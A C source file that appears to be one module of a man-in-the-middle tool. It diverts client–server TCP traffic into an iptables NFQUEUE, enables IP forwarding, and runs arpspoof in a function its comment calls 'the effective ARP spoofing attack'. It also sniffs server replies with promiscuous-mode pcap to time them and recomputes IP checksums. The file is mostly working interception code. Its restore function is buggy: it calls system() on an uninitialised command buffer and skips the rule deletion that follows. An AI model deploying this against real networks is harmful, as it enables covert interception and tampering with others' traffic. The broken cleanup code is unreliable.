#include "../include/network.h"
#include <fcntl.h>

#include <netinet/tcp.h>
#include <linux/netfilter.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdbool.h>
#include <sys/socket.h>

//function to set a personalized iptables configuration on the client to receive packets
void setup_network_interception() {
  char cmd[256];
  char cmd_mark[256]; 
  char port[6];

  snprintf(port, sizeof(port), "%d", port_server);

  system("iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP");

  if(network_config == 'l'){
    snprintf(cmd_mark, sizeof(cmd_mark), "iptables -I OUTPUT 1 -m mark --mark 1 -j ACCEPT");
    system(cmd_mark);
    snprintf(cmd, sizeof(cmd), "iptables -A OUTPUT -d %s -p tcp --dport %s -j NFQUEUE --queue-num 0", ip_server, port);
    system(cmd);
  }else if(network_config == 'n' || network_config == 'i'){
    snprintf(cmd, sizeof(cmd), "iptables -I FORWARD 1 -s %s -d %s -p tcp --dport %s -j NFQUEUE --queue-num 0", ip_client, ip_server, port);
    system(cmd);
    set_ipforwarding(1);
  }
}

//function to restore the default settings of iptables
void restore_network_default() {
  char cmd[256];
  char cmd_mark[256];
  char port[6];

  snprintf(port, sizeof(port), "%d", port_server);

  system("iptables -D OUTPUT -p icmp --icmp-type redirect -j DROP");

  if(network_config == 'l'){
    snprintf(cmd_mark, sizeof(cmd_mark), "iptables -D OUTPUT -m mark --mark 1 -j ACCEPT");
    system(cmd_mark);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "iptables -D OUTPUT -d %s -p tcp --dport %s -j NFQUEUE --queue-num 0", ip_server, port);
  }else if(network_config == 'n' || network_config == 'i'){
    snprintf(cmd, sizeof(cmd), "iptables -D FORWARD -s %s -d %s -p tcp --dport %s -j NFQUEUE --queue-num 0", ip_client, ip_server, port);
    system(cmd);
    set_ipforwarding(0);
  }
}

//function to set IP forwarding, necessary for MITM proxy outiside localhost
void set_ipforwarding(int setting){
  int fd = open("/proc/sys/net/ipv4/ip_forward", O_WRONLY);

  if(fd == -1){
    perror("Error in opening ipv4 file to set forwarding \n");
    exit(EXIT_FAILURE);
  }

  if(setting == 1){
    if(write(fd, "1", 1) == -1){
      perror("Error writing the ip_forward file! \n");
      exit(EXIT_FAILURE);
    }else{
      printf("IP FORWARDING ENABLED! \n");
    }
  }else{
    if(write(fd, "0", 1) == -1){
      perror("Error ");
    }else{
      printf("IP FORWARDING DISABLED! \n");
    }
  }

  close(fd);
}


void disable_hardware_offloading(const char *interface){
  if(interface == NULL){
    perror("Interface is NULL! \n");
    exit(EXIT_FAILURE);
  }

  char cmd[256];
  snprintf(cmd, sizeof(cmd), "ethtool -K %s rx off tx off 2>/dev/null", interface);
  if(system(cmd) != 0){
    fprintf(stderr, "Error in disabling hardware offloading on interface %s! \n", interface);
    exit(EXIT_FAILURE); 
  }else{
    printf("Hardware offloading disabled on interface %s! \n", interface);
  }
}

//function to restore hardware offloading on the interface
void restore_hardware_offloading(const char *interface){
  if(interface == NULL){
    perror("Interface is NULL! \n");
    exit(EXIT_FAILURE);
  }

  char cmd[256];
  snprintf(cmd, sizeof(cmd), "ethtool -K %s rx on tx on 2>/dev/null", interface);
  if(system(cmd) != 0){
    fprintf(stderr, "Error in restoring hardware offloading on interface %s! \n", interface);
    exit(EXIT_FAILURE); 
  }else{
    printf("Hardware offloading restored on interface %s! \n", interface);
  }
}


//function to do the effective ARP spoofing attack to client and server
pid_t arp_spoofing(const char *target_ip, const char *host_ip){
  pid_t pid = fork();

  if(pid == -1){ //error
    perror("Fork error!");
    exit(EXIT_FAILURE);
  }else if(pid == 0){ //child
    int devnull = open("/dev/null", O_WRONLY);
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);
    close(devnull);
    execl("/usr/sbin/arpspoof", "arpspoof", "-i", "eth0", "-t", target_ip, host_ip, NULL);
    perror("Arp spoofing executing error");
    exit(EXIT_FAILURE);
  }

  return pid;
}

//function to get local IP address and IP gateway address
void get_network_info(char *local_ip, char *gateway_ip){
  FILE *fp;
  char line[256];
  char iface[IFNAMSIZ];
  unsigned long destination, gateway;
  bool gateway_found = false;
  int sockfd;
  struct ifreq ifr;
  struct in_addr gateway_addr;

  fp = fopen("/proc/net/route", "r");

  if(fp == NULL){
    perror("Error in opening proc/net/route file");
    return;
  }

  fgets(line, sizeof(line), fp);

  while(fgets(line, sizeof(line), fp) && !gateway_found){
    if(sscanf(line, "%15s %lx %lx", iface, &destination, &gateway) == 3){
      if(destination == 0x00000000){
        gateway_addr.s_addr = gateway;
        strcpy(gateway_ip, inet_ntoa(gateway_addr));
        gateway_found = true;
      }
    }
  }

  fclose(fp);

  /*
  if(!gateway_found){
    perror("Gateway not found!");
    return;
  } */

  sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if(sockfd < 0){
    perror("Error in creating socket!");
    exit(EXIT_FAILURE);
  }
  
  ifr.ifr_addr.sa_family = AF_INET;
  strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

  if(ioctl(sockfd, SIOCGIFADDR, &ifr) == 0){
    struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
    strcpy(local_ip, inet_ntoa(ipaddr->sin_addr));
  }else{
    perror("Error in ioctl to get local IP address! \n");
  }

  close(sockfd);
}

void get_local_address(const char *server_ip, const int server_port, struct sockaddr_in *local_addr){

  struct sockaddr_in server_addr;
  socklen_t local_addr_len = sizeof(struct sockaddr_in);

  memset(&server_addr, 0, sizeof(server_addr));
  server_addr.sin_family = AF_INET;
  inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
  server_addr.sin_port = htons(server_port);

  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);  

  connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));

  getsockname(sockfd, (struct sockaddr *)local_addr, &local_addr_len);

  close(sockfd);
}

//function to initialize the setup of pcap
pcap_t *setup_pcap(const char *server_interface, const char *server_ip, const int server_port){
  char errbuff[PCAP_ERRBUF_SIZE];
  pcap_t *handle;

  handle = pcap_create(server_interface, errbuff);
  if(handle == NULL){
    fprintf(stderr, "error in pcap_create: %s \n", errbuff);
    return NULL;
  }

  pcap_set_snaplen(handle, BUFSIZ);
  pcap_set_promisc(handle, 1);
  pcap_set_timeout(handle, 1);
  pcap_set_immediate_mode(handle, 1);

  if(pcap_activate(handle) != 0){
    fprintf(stderr, "error in pcap_activate: %s \n", errbuff);
    pcap_close(handle);
    return NULL;
  }

  struct bpf_program fp;
  char filter[256];
  snprintf(filter, sizeof(filter), "src host %s and tcp src port %d", server_ip, server_port);

  if(pcap_compile(handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == -1){
    fprintf(stderr, "Errore pcap_compile (%s): %s\n", filter, pcap_geterr(handle));
    pcap_close(handle);
    return NULL;
  }

  if(pcap_setfilter(handle, &fp) == -1){
    fprintf(stderr, "Errore pcap_setfilter: %s\n", pcap_geterr(handle));
    pcap_freecode(&fp);
    pcap_close(handle);
    return NULL;
  }

  pcap_freecode(&fp);

  return handle;
}


struct timespec get_server_response_time(pcap_t *handle){

  struct pcap_pkthdr *header;
  const u_char *packet;
  int result;
  char errbuf[PCAP_ERRBUF_SIZE];

  struct timespec stop = {0,0};
  struct timespec ts;
  int timeout_counter = 0;
  const int MAX_RETRIES = 1000;

  int eth_header_len = 14;

  pcap_setnonblock(handle, 1, errbuf);

  while(1){
    result = pcap_next_ex(handle, &header, &packet);

    if(result == 1){
      if(header->caplen < sizeof(struct iphdr) + sizeof(struct tcphdr)){
        fprintf(stderr, "Packet too short to contain IP and TCP headers \n");
        continue;
      }

      if(header->caplen < (eth_header_len + sizeof(struct iphdr) + sizeof(struct tcphdr) + 5)){
        fprintf(stderr, "Packet too short to contain application data \n");
        continue;
      }
      clock_gettime(CLOCK_MONOTONIC_RAW, &ts);
      return ts;
    }else if(result == 0){
      usleep(100);
      timeout_counter++;
      if(timeout_counter >= MAX_RETRIES){
        return stop;
      }
      continue;
    }else{
      fprintf(stderr, "Errore durante pcap_next_ex: %s\n", pcap_geterr(handle));
      return stop;
    }
  }

}


void flush_pcap_buffer(pcap_t *handle){
  struct pcap_pkthdr *header;
  const u_char *packet;
  int result;
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_setnonblock(handle, 1, errbuf);

  while(1){
    result = pcap_next_ex(handle, &header, &packet);
    if(result <= 0){
      break; 
    }
  }
}

unsigned short recalculate_ip_checksum(struct iphdr *ip_header){
  ip_header->check = 0;
  unsigned long sum = 0;
  unsigned short *ptr = (unsigned short *)ip_header;
  int ip_header_len = ip_header->ihl * 4; //lenght of the ip header is expressed in 32-bit words, i need to convert it in bytes
  int i;

  for(i=0; i< ip_header_len / 2; i++){
    sum += ptr[i];
  }

  while(sum >> 16){
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  return (unsigned short)(~sum & 0xFFFF);
}